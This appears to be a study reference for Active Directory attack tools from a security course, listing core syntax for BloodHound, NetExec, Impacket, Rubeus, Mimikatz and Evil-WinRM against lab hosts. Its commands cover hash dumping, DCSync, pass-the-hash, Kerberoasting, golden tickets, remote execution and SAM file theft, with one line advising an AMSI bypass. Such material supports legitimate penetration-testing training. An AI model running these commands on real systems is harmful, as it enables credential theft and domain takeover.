# Active Directory and Windows Tools

AD attack tooling. Covered in depth in Phase 13 — this is the reference for what each tool does and core syntax.

## Resources

- BloodHound docs: https://bloodhound.readthedocs.io/
- Impacket: https://github.com/fortra/impacket
- PayloadsAllTheThings AD: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- harmj0y blog: https://blog.harmj0y.net/

## BloodHound + Collectors

```bash
# Install BloodHound (CE — Community Edition)
docker run -p 8080:8080 specterops/bloodhound-ce

# Collect with bloodhound-python (from Linux, no RCE needed)
pip install bloodhound
bloodhound-python -u user -p 'Password123' -d corp.local -c All -ns 192.168.1.10

# Collect with SharpHound (from Windows host)
.\SharpHound.exe -c All --zipfilename bh-data.zip

# Upload zip to BloodHound UI
# Queries: "Find all Domain Admins", "Shortest path to DA", "Find Kerberoastable users"
```

## CrackMapExec / NetExec

```bash
# Install
pip install netexec   # nxc replaces cme

# SMB enumeration
nxc smb 192.168.1.0/24                        # host discovery
nxc smb 192.168.1.10 -u user -p 'Pass123'   # authenticate
nxc smb 192.168.1.10 -u user -p 'Pass123' --shares  # list shares
nxc smb 192.168.1.10 -u user -p 'Pass123' --users   # list domain users
nxc smb 192.168.1.10 -u user -p 'Pass123' --pass-pol # password policy

# Pass-the-hash
nxc smb 192.168.1.10 -u Administrator -H '<NTLM_hash>' --shares

# Execute command
nxc smb 192.168.1.10 -u user -p 'Pass123' -x "whoami" --exec-method wmiexec

# Check for local admin across subnet
nxc smb 192.168.1.0/24 -u user -p 'Pass123' --local-auth
```

## Impacket Suite

```bash
# SecretsDump — dump hashes (DCSYNC or local SAM)
secretsdump.py corp.local/user:Pass123@192.168.1.10
secretsdump.py corp.local/Administrator:Pass123@DC01 -just-dc   # DCSync

# PSExec — semi-interactive shell (needs admin share write)
psexec.py corp.local/Administrator:Pass123@192.168.1.10

# WMIExec — shell via WMI (no service installation)
wmiexec.py corp.local/user:Pass123@192.168.1.10

# Pass-the-hash with psexec
psexec.py -hashes :<NTLM_hash> Administrator@192.168.1.10

# GetUserSPNs — Kerberoasting
GetUserSPNs.py corp.local/user:Pass123 -dc-ip 192.168.1.10 -request

# GetNPUsers — AS-REP Roasting
GetNPUsers.py corp.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt

# Certipy — AD CS attacks
certipy find -u user@corp.local -p Pass123 -dc-ip 192.168.1.10
certipy req -u user@corp.local -p Pass123 -target-ip 192.168.1.10 -ca 'CORP-CA' -template 'User'
```

## PowerView (AD Enumeration from PowerShell)

```powershell
# Load (bypass AMSI first in real engagements)
Import-Module .\PowerView.ps1

# Basic enumeration
Get-Domain
Get-DomainUser | Select-Object name, samaccountname, description
Get-DomainGroup "Domain Admins" | Select-Object member
Get-DomainComputer | Select-Object name, operatingsystem
Get-DomainGPO | Select-Object displayname

# Find local admin access
Find-LocalAdminAccess

# Check shares
Find-DomainShare -CheckShareAccess

# ACL abuse — find interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "user" }
```

## Rubeus (Kerberos Attacks)

```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /nowrap

# AS-REP Roasting
.\Rubeus.exe asreproast /nowrap

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:base64encodedticket==

# Request TGT
.\Rubeus.exe asktgt /user:Administrator /password:Pass123 /nowrap

# Overpass-the-hash
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_hash> /nowrap
```

## Mimikatz

```powershell
# Enable debug privilege
privilege::debug

# Dump LSASS credentials
sekurlsa::logonpasswords

# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe

# DCSync
lsadump::dcsync /user:krbtgt /domain:corp.local

# Golden ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt
```

## Evil-WinRM

```bash
# Connect with password
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123'

# Connect with hash
evil-winrm -i 192.168.1.10 -u Administrator -H '<NTLM_hash>'

# Upload / download
*Evil-WinRM* PS> upload /local/path /remote/path
*Evil-WinRM* PS> download C:\Windows\System32\config\SAM /tmp/SAM

# Load PowerShell scripts
evil-winrm -i 192.168.1.10 -u user -p pass -s /path/to/ps1/scripts/
```

## Ethical Note

All AD tools generate significant logs and alerts. Only use in authorized lab or engagement environments. DCSync and Pass-the-Hash are highly detectable by modern EDR solutions.
